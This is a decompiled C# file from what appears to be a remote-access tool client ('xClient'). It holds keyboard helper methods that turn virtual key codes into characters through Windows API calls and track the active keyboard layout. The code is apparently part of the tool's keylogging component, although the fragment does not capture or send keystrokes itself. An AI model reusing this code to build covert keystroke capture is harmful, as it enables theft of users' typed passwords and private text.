using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x0200007A RID: 122
	internal static class KeyboardNativeMethods
	{
		// Token: 0x0600032E RID: 814 RVA: 0x0000F4EC File Offset: 0x0000D6EC
		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
		{
			IntPtr activeKeyboard = KeyboardNativeMethods.GetActiveKeyboard();
			int scanCode = KeyboardNativeMethods.MapVirtualKeyEx(virtualKeyCode, 0, activeKeyboard);
			KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
		}

		// Token: 0x0600032F RID: 815 RVA: 0x0000F514 File Offset: 0x0000D714
		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
		{
			IntPtr activeKeyboard = KeyboardNativeMethods.GetActiveKeyboard();
			KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
		}

		// Token: 0x06000330 RID: 816 RVA: 0x0000F534 File Offset: 0x0000D734
		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
		{
			StringBuilder stringBuilder = new StringBuilder(64);
			KeyboardState current = KeyboardState.GetCurrent();
			byte[] nativeState = current.GetNativeState();
			bool flag = false;
			if (current.IsDown(Keys.ShiftKey))
			{
				nativeState[16] = 128;
			}
			if (current.IsToggled(Keys.Capital))
			{
				nativeState[20] = 1;
			}
			switch (KeyboardNativeMethods.ToUnicodeEx(virtualKeyCode, scanCode, nativeState, stringBuilder, stringBuilder.Capacity, fuState, dwhkl))
			{
			case -1:
				flag = true;
				KeyboardNativeMethods.ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
				chars = null;
				break;
			case 0:
				chars = null;
				break;
			case 1:
				if (stringBuilder.Length > 0)
				{
					chars = new char[]
					{
						stringBuilder[0]
					};
				}
				else
				{
					chars = null;
				}
				break;
			default:
				if (stringBuilder.Length > 1)
				{
					chars = new char[]
					{
						stringBuilder[0],
						stringBuilder[1]
					};
				}
				else
				{
					chars = new char[]
					{
						stringBuilder[0]
					};
				}
				break;
			}
			if (KeyboardNativeMethods.lastVirtualKeyCode != 0 && KeyboardNativeMethods.lastIsDead)
			{
				if (chars != null)
				{
					StringBuilder stringBuilder2 = new StringBuilder(5);
					KeyboardNativeMethods.ToUnicodeEx(KeyboardNativeMethods.lastVirtualKeyCode, KeyboardNativeMethods.lastScanCode, KeyboardNativeMethods.lastKeyState, stringBuilder2, stringBuilder2.Capacity, 0, dwhkl);
					KeyboardNativeMethods.lastIsDead = false;
					KeyboardNativeMethods.lastVirtualKeyCode = 0;
				}
				return;
			}
			KeyboardNativeMethods.lastScanCode = scanCode;
			KeyboardNativeMethods.lastVirtualKeyCode = virtualKeyCode;
			KeyboardNativeMethods.lastIsDead = flag;
			KeyboardNativeMethods.lastKeyState = (byte[])nativeState.Clone();
		}

		// Token: 0x06000331 RID: 817 RVA: 0x0000F698 File Offset: 0x0000D898
		private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
		{
			StringBuilder stringBuilder = new StringBuilder(10);
			int num;
			do
			{
				byte[] lpKeyState = new byte[255];
				num = KeyboardNativeMethods.ToUnicodeEx(vk, sc, lpKeyState, stringBuilder, stringBuilder.Capacity, 0, hkl);
			}
			while (num < 0);
		}

		// Token: 0x06000332 RID: 818 RVA: 0x0000F6D0 File Offset: 0x0000D8D0
		private static IntPtr GetActiveKeyboard()
		{
			IntPtr foregroundWindow = ThreadNativeMethods.GetForegroundWindow();
			int num;
			int windowThreadProcessId = ThreadNativeMethods.GetWindowThreadProcessId(foregroundWindow, out num);
			return KeyboardNativeMethods.GetKeyboardLayout(windowThreadProcessId);
		}

		// Token: 0x06000333 RID: 819
		[Obsolete("Use ToUnicodeEx instead")]
		[DllImport("user32.dll")]
		public static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpbKeyState, byte[] lpwTransKey, int fuState);

		// Token: 0x06000334 RID: 820
		[DllImport("user32.dll")]
		public static extern int ToUnicodeEx(int wVirtKey, int wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, int wFlags, IntPtr dwhkl);

		// Token: 0x06000335 RID: 821
		[DllImport("user32.dll")]
		public static extern int GetKeyboardState(byte[] pbKeyState);

		// Token: 0x06000336 RID: 822
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		public static extern short GetKeyState(int vKey);

		// Token: 0x06000337 RID: 823
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		internal static extern int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl);

		// Token: 0x06000338 RID: 824
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		internal static extern IntPtr GetKeyboardLayout(int dwLayout);

		// Token: 0x0400014D RID: 333
		public const byte VK_SHIFT = 16;

		// Token: 0x0400014E RID: 334
		public const byte VK_CAPITAL = 20;

		// Token: 0x0400014F RID: 335
		public const byte VK_NUMLOCK = 144;

		// Token: 0x04000150 RID: 336
		public const byte VK_LSHIFT = 160;

		// Token: 0x04000151 RID: 337
		public const byte VK_RSHIFT = 161;

		// Token: 0x04000152 RID: 338
		public const byte VK_LCONTROL = 162;

		// Token: 0x04000153 RID: 339
		public const byte VK_RCONTROL = 163;

		// Token: 0x04000154 RID: 340
		public const byte VK_LMENU = 164;

		// Token: 0x04000155 RID: 341
		public const byte VK_RMENU = 165;

		// Token: 0x04000156 RID: 342
		public const byte VK_LWIN = 91;

		// Token: 0x04000157 RID: 343
		public const byte VK_RWIN = 92;

		// Token: 0x04000158 RID: 344
		public const byte VK_SCROLL = 145;

		// Token: 0x04000159 RID: 345
		public const byte VK_INSERT = 45;

		// Token: 0x0400015A RID: 346
		public const byte VK_CONTROL = 17;

		// Token: 0x0400015B RID: 347
		public const byte VK_MENU = 18;

		// Token: 0x0400015C RID: 348
		public const byte VK_PACKET = 231;

		// Token: 0x0400015D RID: 349
		private static int lastVirtualKeyCode = 0;

		// Token: 0x0400015E RID: 350
		private static int lastScanCode = 0;

		// Token: 0x0400015F RID: 351
		private static byte[] lastKeyState = new byte[256];

		// Token: 0x04000160 RID: 352
		private static bool lastIsDead = false;

		// Token: 0x0200007B RID: 123
		internal enum MapType
		{
			// Token: 0x04000162 RID: 354
			MAPVK_VK_TO_VSC,
			// Token: 0x04000163 RID: 355
			MAPVK_VSC_TO_VK,
			// Token: 0x04000164 RID: 356
			MAPVK_VK_TO_CHAR,
			// Token: 0x04000165 RID: 357
			MAPVK_VSC_TO_VK_EX
		}
	}
}
